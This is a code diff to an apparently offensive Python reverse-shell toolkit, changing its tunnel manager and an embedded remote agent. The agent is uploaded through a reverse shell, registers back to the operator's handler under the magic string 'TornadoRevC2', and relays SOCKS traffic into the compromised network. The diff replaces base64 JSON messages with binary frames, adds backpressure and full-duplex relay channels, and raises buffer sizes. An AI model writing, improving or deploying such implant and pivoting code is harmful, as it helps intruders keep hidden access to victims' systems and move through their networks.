@@ -10,44 +10,70 @@ import time
 
 from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START, TUNNEL_REGISTER_MAGIC
 
-TUNNEL_POOL_SIZE = 3
-MAX_STREAM_BUF = 256 * 1024
-RELAY_CHUNK = 16384
-RELAY_IDLE_TIMEOUT = 3.0
-RELAY_ACTIVE_TIMEOUT = 20.0
+TUNNEL_POOL_SIZE = 4
+RELAY_CHUNK = 262144
+MAX_FRAME = 32 * 1024 * 1024
+RELAY_IDLE_TIMEOUT = 5.0
+RELAY_ACTIVE_TIMEOUT = 120.0
+SOCK_BUF = 2 * 1024 * 1024
+FRAME_JSON = 0
+FRAME_SEND = 1
+FRAME_RECV_REQ = 2
+FRAME_RECV_RESP = 3
 
 _REMOTE_AGENT_SOURCE = r'''
 import base64, json, socket, struct, sys, threading, time
 
-CHANNELS = 3
-MAX_BUF = 262144
+CHANNELS = 4
+MAX_BUF = 16777216
+MAX_FRAME = 33554432
+RECV_SIZE = 262144
+SOCK_BUF = 2097152
 
-def recv_msg(conn):
-    hdr = b''
-    while len(hdr) < 4:
-        chunk = conn.recv(4 - len(hdr))
-        if not chunk:
-            return None
-        hdr += chunk
-    length = struct.unpack('>I', hdr)[0]
-    if length > 8 * 1024 * 1024:
-        return None
+def recv_exact(conn, n):
     data = b''
-    while len(data) < length:
-        chunk = conn.recv(min(65536, length - len(data)))
+    while len(data) < n:
+        chunk = conn.recv(n - len(data))
         if not chunk:
             return None
         data += chunk
-    return json.loads(data.decode('utf-8'))
+    return data
 
-def send_msg(conn, obj):
-    payload = json.dumps(obj, separators=(',', ':')).encode('utf-8')
+def recv_frame(conn):
+    hdr = recv_exact(conn, 4)
+    if not hdr:
+        return None
+    length = struct.unpack('>I', hdr)[0]
+    if length == 0 or length > MAX_FRAME:
+        return None
+    body = recv_exact(conn, length)
+    if not body:
+        return None
+    typ = body[0]
+    if typ == 0:
+        return json.loads(body[1:].decode('utf-8'))
+    if typ == 1:
+        sid = struct.unpack('>I', body[1:5])[0]
+        return {'op': 'sendb', 'sid': sid, 'data': body[5:]}
+    if typ == 2:
+        sid, max_bytes = struct.unpack('>II', body[1:9])
+        return {'op': 'recvb', 'sid': sid, 'max': max_bytes}
+    return None
+
+def send_json(conn, obj):
+    payload = b'\x00' + json.dumps(obj, separators=(',', ':')).encode('utf-8')
     conn.sendall(struct.pack('>I', len(payload)) + payload)
+
+def send_recvb(conn, sid, data, closed):
+    body = struct.pack('>BIB', 3, sid, 1 if closed else 0) + data
+    conn.sendall(struct.pack('>I', len(body)) + body)
 
 def tune_sock(sock):
     try:
         sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUF)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUF)
     except Exception:
         pass
 
@@ -107,17 +133,22 @@ def gc_streams(streams, lock):
 def pump(entry):
     sock = entry['sock']
     buf_lock = entry['buf_lock']
+    drain = entry['drain']
     sock.settimeout(1.0)
     while not entry.get('closed'):
+        with buf_lock:
+            if len(entry['buf']) >= MAX_BUF:
+                drain.clear()
+        if not drain.is_set():
+            drain.wait(timeout=0.5)
+            continue
         try:
-            piece = sock.recv(65536)
+            piece = sock.recv(RECV_SIZE)
             if not piece:
                 entry['closed'] = True
                 break
             with buf_lock:
                 entry['buf'] += piece
-                if len(entry['buf']) > MAX_BUF:
-                    entry['buf'] = entry['buf'][-MAX_BUF:]
         except socket.timeout:
             continue
         except Exception:
@@ -129,6 +160,8 @@ def read_buf(entry, max_bytes):
         if entry['buf']:
             chunk = entry['buf'][:max_bytes]
             entry['buf'] = entry['buf'][len(chunk):]
+            if len(entry['buf']) < MAX_BUF:
+                entry['drain'].set()
             return chunk, entry['closed']
         return b'', entry['closed']
 
@@ -145,13 +178,13 @@ def close_stream(streams, lock, sid):
 def serve(conn, streams, lock):
     try:
         while True:
-            msg = recv_msg(conn)
+            msg = recv_frame(conn)
             if not msg:
                 break
             op = msg.get('op')
             sid = msg.get('sid')
             if op == 'ping':
-                send_msg(conn, {'ok': True, 'op': 'pong'})
+                send_json(conn, {'ok': True, 'op': 'pong'})
             elif op == 'connect':
                 host = msg.get('host', '127.0.0.1')
                 port = int(msg.get('port', 0))
@@ -160,81 +193,53 @@ def serve(conn, streams, lock):
                     remote = socket.create_connection((host, port), timeout=10)
                     tune_sock(remote)
                     entry = {
-                        'sock': remote, 'buf': b'', 'buf_lock': threading.Lock(), 'closed': False,
+                        'sock': remote, 'buf': b'', 'buf_lock': threading.Lock(),
+                        'drain': threading.Event(), 'closed': False,
                     }
+                    entry['drain'].set()
                     with lock:
                         streams[sid] = entry
                     threading.Thread(target=pump, args=(entry,), daemon=True).start()
-                    send_msg(conn, {'ok': True, 'sid': sid})
+                    send_json(conn, {'ok': True, 'sid': sid})
                 except Exception as exc:
-                    send_msg(conn, {'ok': False, 'sid': sid, 'error': str(exc)})
-            elif op == 'send':
-                data = base64.b64decode(msg.get('data', '') or '')
+                    send_json(conn, {'ok': False, 'sid': sid, 'error': str(exc)})
+            elif op in ('send', 'sendb'):
+                data = msg.get('data', b'') if op == 'sendb' else base64.b64decode(msg.get('data', '') or '')
                 with lock:
                     entry = streams.get(sid)
                 if not entry or entry['closed']:
-                    send_msg(conn, {'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
+                    send_json(conn, {'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
                     continue
                 try:
                     entry['sock'].sendall(data)
-                    send_msg(conn, {'ok': True, 'sid': sid})
+                    send_json(conn, {'ok': True, 'sid': sid})
                 except Exception as exc:
                     entry['closed'] = True
-                    send_msg(conn, {'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
-            elif op == 'recv':
-                max_bytes = int(msg.get('max', 65536))
+                    send_json(conn, {'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
+            elif op in ('recv', 'recvb'):
+                max_bytes = int(msg.get('max', RECV_SIZE))
                 with lock:
                     entry = streams.get(sid)
                 if not entry:
-                    send_msg(conn, {'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
+                    send_json(conn, {'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
                     continue
                 chunk, closed = read_buf(entry, max_bytes)
-                send_msg(conn, {
-                    'ok': True, 'sid': sid,
-                    'data': base64.b64encode(chunk).decode('ascii'),
-                    'closed': closed,
-                })
+                if op == 'recvb':
+                    send_recvb(conn, sid, chunk, closed)
+                else:
+                    send_json(conn, {
+                        'ok': True, 'sid': sid,
+                        'data': base64.b64encode(chunk).decode('ascii'),
+                        'closed': closed,
+                    })
             elif op == 'close':
                 close_stream(streams, lock, sid)
-                send_msg(conn, {'ok': True, 'sid': sid})
-            elif op == 'batch':
-                results = []
-                for item in msg.get('items', []):
-                    sub = dict(item)
-                    sub_op = sub.pop('op', '')
-                    sid = sub.get('sid')
-                    if sub_op == 'send':
-                        data = base64.b64decode(sub.get('data', '') or '')
-                        with lock:
-                            entry = streams.get(sid)
-                        if not entry or entry['closed']:
-                            results.append({'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
-                            continue
-                        try:
-                            entry['sock'].sendall(data)
-                            results.append({'ok': True, 'sid': sid})
-                        except Exception as exc:
-                            entry['closed'] = True
-                            results.append({'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
-                    elif sub_op == 'recv':
-                        max_bytes = int(sub.get('max', 65536))
-                        with lock:
-                            entry = streams.get(sid)
-                        if not entry:
-                            results.append({'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
-                            continue
-                        chunk, closed = read_buf(entry, max_bytes)
-                        results.append({
-                            'ok': True, 'sid': sid,
-                            'data': base64.b64encode(chunk).decode('ascii'),
-                            'closed': closed,
-                        })
-                send_msg(conn, {'ok': True, 'results': results})
+                send_json(conn, {'ok': True, 'sid': sid})
             elif op == 'gc':
                 gc_streams(streams, lock)
-                send_msg(conn, {'ok': True})
+                send_json(conn, {'ok': True})
             else:
-                send_msg(conn, {'ok': False, 'error': 'unknown op'})
+                send_json(conn, {'ok': False, 'error': 'unknown op'})
     finally:
         gc_streams(streams, lock)
 
@@ -244,8 +249,8 @@ def worker(streams, lock, handler_host, handler_port, token):
         try:
             conn = socket.create_connection((handler_host, handler_port), timeout=20)
             tune_sock(conn)
-            send_msg(conn, {'op': 'register', 'token': token, 'magic': 'TornadoRevC2'})
-            ack = recv_msg(conn)
+            send_json(conn, {'op': 'register', 'token': token, 'magic': 'TornadoRevC2'})
+            ack = recv_frame(conn)
             if not ack or not ack.get('ok'):
                 conn.close()
                 time.sleep(2)
@@ -288,29 +293,50 @@ def _set_keepalive(sock):
     try:
         sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUF)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUF)
     except OSError:
         pass
 
 
-def _recv_framed(conn, timeout=15.0):
+def _recv_exact(conn, n, timeout=15.0):
+    conn.settimeout(timeout)
+    data = b''
+    while len(data) < n:
+        chunk = conn.recv(n - len(data))
+        if not chunk:
+            return None
+        data += chunk
+    return data
+
+
+def _read_frame(conn, timeout=15.0):
+    """Read one tunnel frame; return (message_dict_or_None, hard_fail)."""
     conn.settimeout(timeout)
     try:
-        hdr = b''
-        while len(hdr) < 4:
-            chunk = conn.recv(4 - len(hdr))
-            if not chunk:
-                return None
-            hdr += chunk
+        hdr = _recv_exact(conn, 4, timeout=timeout)
+        if not hdr:
+            return None, True
         length = struct.unpack('>I', hdr)[0]
-        if length > 16 * 1024 * 1024:
-            return None
-        data = b''
-        while len(data) < length:
-            chunk = conn.recv(min(65536, length - len(data)))
-            if not chunk:
-                return None
-            data += chunk
-        return data
+        if length == 0 or length > MAX_FRAME:
+            return None, True
+        body = _recv_exact(conn, length, timeout=timeout)
+        if not body:
+            return None, True
+        typ = body[0]
+        if typ == FRAME_JSON:
+            return json.loads(body[1:].decode('utf-8')), False
+        if typ == ord('{'):
+            return json.loads(body.decode('utf-8')), False
+        if typ == FRAME_RECV_RESP:
+            sid = struct.unpack('>I', body[1:5])[0]
+            closed = bool(body[5])
+            return {'op': '_recvb', 'sid': sid, 'data': body[6:], 'closed': closed}, False
+        return None, True
+    except socket.timeout:
+        return None, False
+    except (OSError, json.JSONDecodeError):
+        return None, True
     finally:
         try:
             conn.settimeout(None)
@@ -318,8 +344,26 @@ def _recv_framed(conn, timeout=15.0):
             pass
 
 
+def _send_json(conn, obj):
+    payload = b'\x00' + json.dumps(obj, separators=(',', ':')).encode('utf-8')
+    conn.sendall(struct.pack('>I', len(payload)) + payload)
+
+
+def _recv_framed(conn, timeout=15.0):
+    msg, hard = _read_frame(conn, timeout=timeout)
+    if msg is None:
+        return None
+    if msg.get('op') == '_recvb':
+        return None
+    return json.dumps(msg, separators=(',', ':')).encode('utf-8')
+
+
 def _send_framed(conn, payload_bytes):
-    conn.sendall(struct.pack('>I', len(payload_bytes)) + payload_bytes)
+    if payload_bytes[:1] == b'{':
+        payload = b'\x00' + payload_bytes
+    else:
+        payload = payload_bytes
+    conn.sendall(struct.pack('>I', len(payload)) + payload)
 
 
 class TunnelManager:
@@ -376,12 +420,10 @@ class TunnelManager:
 
     def _register_tunnel(self, conn):
         try:
-            conn.settimeout(20.0)
-            raw = _recv_framed(conn, timeout=20.0)
-            if not raw:
+            msg, _hard = _read_frame(conn, timeout=20.0)
+            if not msg:
                 conn.close()
                 return
-            msg = json.loads(raw.decode('utf-8'))
             if msg.get('op') != 'register' or msg.get('magic') != TUNNEL_REGISTER_MAGIC:
                 conn.close()
                 return
@@ -398,7 +440,7 @@ class TunnelManager:
                     return
                 pool.append(conn)
                 self._conn_locks.setdefault(id(conn), threading.Lock())
-            _send_framed(conn, json.dumps({'ok': True}, separators=(',', ':')).encode('utf-8'))
+            _send_json(conn, {'ok': True})
             ready = self._channel_ready.get(token)
             if ready:
                 ready.set()
@@ -471,8 +513,21 @@ class TunnelManager:
                     return True
         return self._has_channels(client_sock)
 
+    def _pick_two_channels(self, client_sock):
+        alive = self._alive_conns(client_sock)
+        if not alive:
+            return None, None
+        if len(alive) == 1:
+            return alive[0], alive[0]
+        with self._lock:
+            idx = self._channel_rr.get(client_sock, 0) % len(alive)
+            self._channel_rr[client_sock] = idx + 2
+        up = alive[idx]
+        down = alive[(idx + 1) % len(alive)]
+        return up, down
+
     def _request_on(self, conn, message, timeout=30.0):
-        """Send one framed request; return (response, hard_fail)."""
+        """Send one JSON request; return (response, hard_fail)."""
         if not self._conn_alive(conn):
             return None, True
         lock = self._conn_lock(conn)
@@ -481,15 +536,64 @@ class TunnelManager:
                 if not self._conn_alive(conn):
                     return None, True
                 conn.settimeout(timeout)
-                _send_framed(conn, json.dumps(message, separators=(',', ':')).encode('utf-8'))
-                raw = _recv_framed(conn, timeout=timeout)
-                if not raw:
-                    return None, True
-                return json.loads(raw.decode('utf-8')), False
+                _send_json(conn, message)
+                resp, hard_fail = _read_frame(conn, timeout=timeout)
+                return resp, hard_fail
             except socket.timeout:
                 return None, False
-            except (OSError, json.JSONDecodeError):
+            except OSError:
                 return None, True
+            finally:
+                try:
+                    conn.settimeout(None)
+                except OSError:
+                    pass
+
+    def _send_bulk(self, conn, sid, data, timeout=RELAY_ACTIVE_TIMEOUT):
+        if not self._conn_alive(conn):
+            return False, True
+        lock = self._conn_lock(conn)
+        with lock:
+            try:
+                body = struct.pack('>BI', FRAME_SEND, sid) + data
+                conn.settimeout(timeout)
+                conn.sendall(struct.pack('>I', len(body)) + body)
+                resp, hard_fail = _read_frame(conn, timeout=timeout)
+                if resp is None:
+                    return False, hard_fail
+                return bool(resp.get('ok')), False
+            except socket.timeout:
+                return False, False
+            except OSError:
+                return False, True
+            finally:
+                try:
+                    conn.settimeout(None)
+                except OSError:
+                    pass
+
+    def _recv_bulk(self, conn, sid, max_bytes=RELAY_CHUNK, timeout=RELAY_IDLE_TIMEOUT):
+        if not self._conn_alive(conn):
+            return b'', False, True
+        lock = self._conn_lock(conn)
+        with lock:
+            try:
+                body = struct.pack('>BII', FRAME_RECV_REQ, sid, max_bytes)
+                conn.settimeout(timeout)
+                conn.sendall(struct.pack('>I', len(body)) + body)
+                resp, hard_fail = _read_frame(conn, timeout=timeout)
+                if resp is None:
+                    return b'', False, hard_fail
+                if resp.get('op') == '_recvb':
+                    return resp.get('data', b''), bool(resp.get('closed')), False
+                if resp.get('ok'):
+                    chunk = base64.b64decode(resp.get('data', '') or '')
+                    return chunk, bool(resp.get('closed')), False
+                return b'', bool(resp.get('closed')), False
+            except socket.timeout:
+                return b'', False, False
+            except OSError:
+                return b'', False, True
             finally:
                 try:
                     conn.settimeout(None)
@@ -557,9 +661,11 @@ class TunnelManager:
 
     def _upload_agent(self, client_sock, agent_path, shell_type):
         data = _REMOTE_AGENT_SOURCE.encode('utf-8')
-        for offset in range(0, len(data), 8192):
+        chunk_size = self.h._write_chunk_size(agent_path, shell_type)
+        for offset in range(0, len(data), chunk_size):
             if not self.h._remote_write_chunk(
-                client_sock, agent_path, data[offset:offset + 8192], shell_type, truncate=(offset == 0),
+                client_sock, agent_path, data[offset:offset + chunk_size], shell_type,
+                truncate=(offset == 0), skip_flush=(offset > 0),
             ):
                 self._set_error('failed to upload tunnel agent')
                 return False
@@ -744,7 +850,7 @@ class TunnelManager:
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
             listener.bind(('127.0.0.1', listen_port))
-            listener.listen(256)
+            listener.listen(512)
         except OSError as exc:
             listener.close()
             print(f"{self.h.colors['red']}Cannot bind 127.0.0.1:{listen_port}: {exc}{self.h.colors['end']}")
@@ -833,8 +939,52 @@ class TunnelManager:
                 return None
         return data if len(data) == n else None
 
-    def _relay(self, client_sock, tunnel_conn, sid, conn):
-        """Relay data between SOCKS client and one pinned tunnel channel."""
+    def _relay_upload(self, client_sock, up_conn, sid, conn, stop):
+        while not stop.is_set() and client_sock in self.h.revshell_clients and self._conn_alive(up_conn):
+            try:
+                r, _, _ = select.select([conn], [], [], 0.1)
+                if not r:
+                    continue
+                data = conn.recv(RELAY_CHUNK)
+                if not data:
+                    stop.set()
+                    break
+                ok, hard_fail = self._send_bulk(up_conn, sid, data)
+                if not ok:
+                    if hard_fail:
+                        stop.set()
+                    break
+            except OSError:
+                stop.set()
+                break
+
+    def _relay_download(self, client_sock, down_conn, sid, conn, stop):
+        idle_rounds = 0
+        while not stop.is_set() and client_sock in self.h.revshell_clients and self._conn_alive(down_conn):
+            data, closed, hard_fail = self._recv_bulk(
+                down_conn, sid, RELAY_CHUNK,
+                timeout=RELAY_ACTIVE_TIMEOUT if idle_rounds == 0 else RELAY_IDLE_TIMEOUT,
+            )
+            if hard_fail:
+                stop.set()
+                break
+            if data:
+                try:
+                    conn.sendall(data)
+                except OSError:
+                    stop.set()
+                    break
+                idle_rounds = 0
+            else:
+                idle_rounds += 1
+                if idle_rounds > 60:
+                    stop.set()
+                    break
+            if closed:
+                stop.set()
+                break
+
+    def _relay_single(self, client_sock, tunnel_conn, sid, conn):
         idle_rounds = 0
         while client_sock in self.h.revshell_clients and self._conn_alive(tunnel_conn):
             outbound = None
@@ -848,55 +998,59 @@ class TunnelManager:
                 break
 
             if outbound:
-                message = {
-                    'op': 'batch',
-                    'items': [
-                        {
-                            'op': 'send', 'sid': sid,
-                            'data': base64.b64encode(outbound).decode('ascii'),
-                        },
-                        {'op': 'recv', 'sid': sid, 'max': RELAY_CHUNK},
-                    ],
-                }
-                resp, hard_fail = self._request_on(
-                    tunnel_conn, message, timeout=RELAY_ACTIVE_TIMEOUT,
-                )
+                ok, hard_fail = self._send_bulk(tunnel_conn, sid, outbound)
+                if not ok and hard_fail:
+                    break
                 idle_rounds = 0
-            else:
-                resp, hard_fail = self._request_on(
-                    tunnel_conn,
-                    {'op': 'recv', 'sid': sid, 'max': RELAY_CHUNK},
-                    timeout=RELAY_IDLE_TIMEOUT,
-                )
-                idle_rounds += 1
 
-            if resp is None:
-                if hard_fail:
-                    break
-                if idle_rounds > 40:
-                    break
-                continue
-
-            idle_rounds = 0
-            if resp.get('results') is not None:
-                results = resp['results']
-                if outbound and results and not results[0].get('ok', True):
-                    break
-                recv_res = results[-1] if results else None
-            else:
-                recv_res = resp
-            if recv_res and recv_res.get('data'):
+            data, closed, hard_fail = self._recv_bulk(
+                tunnel_conn, sid, RELAY_CHUNK,
+                timeout=RELAY_ACTIVE_TIMEOUT if outbound else RELAY_IDLE_TIMEOUT,
+            )
+            if hard_fail:
+                break
+            if data:
                 try:
-                    conn.sendall(base64.b64decode(recv_res['data']))
+                    conn.sendall(data)
                 except OSError:
                     break
-            if recv_res and recv_res.get('closed'):
-                break
-            if recv_res and recv_res.get('ok') is False and recv_res.get('error') in ('closed', 'missing'):
+                idle_rounds = 0
+            else:
+                idle_rounds += 1
+                if idle_rounds > 60:
+                    break
+            if closed:
                 break
 
         if tunnel_conn and self._conn_alive(tunnel_conn):
             self._request_on(tunnel_conn, {'op': 'close', 'sid': sid}, timeout=3.0)
+
+    def _relay(self, client_sock, up_conn, down_conn, sid, conn):
+        """Full-duplex bulk relay when two channels are available."""
+        if up_conn is down_conn:
+            self._relay_single(client_sock, up_conn, sid, conn)
+            return
+
+        stop = threading.Event()
+        threads = [
+            threading.Thread(
+                target=self._relay_upload,
+                args=(client_sock, up_conn, sid, conn, stop),
+                daemon=True,
+            ),
+            threading.Thread(
+                target=self._relay_download,
+                args=(client_sock, down_conn, sid, conn, stop),
+                daemon=True,
+            ),
+        ]
+        for thread in threads:
+            thread.start()
+        for thread in threads:
+            thread.join()
+
+        if up_conn and self._conn_alive(up_conn):
+            self._request_on(up_conn, {'op': 'close', 'sid': sid}, timeout=3.0)
 
     def _conn_alive(self, conn):
         try:
@@ -962,7 +1116,11 @@ class TunnelManager:
 
             conn.sendall(b'\x05\x00\x00\x01' + socket.inet_aton('0.0.0.0') + struct.pack('!H', 0))
             conn.setblocking(False)
-            self._relay(client_sock, tunnel_conn, sid, conn)
+            up_conn, down_conn = self._pick_two_channels(client_sock)
+            if not up_conn:
+                up_conn = tunnel_conn
+                down_conn = tunnel_conn
+            self._relay(client_sock, up_conn, down_conn, sid, conn)
         except Exception:
             pass
         finally:
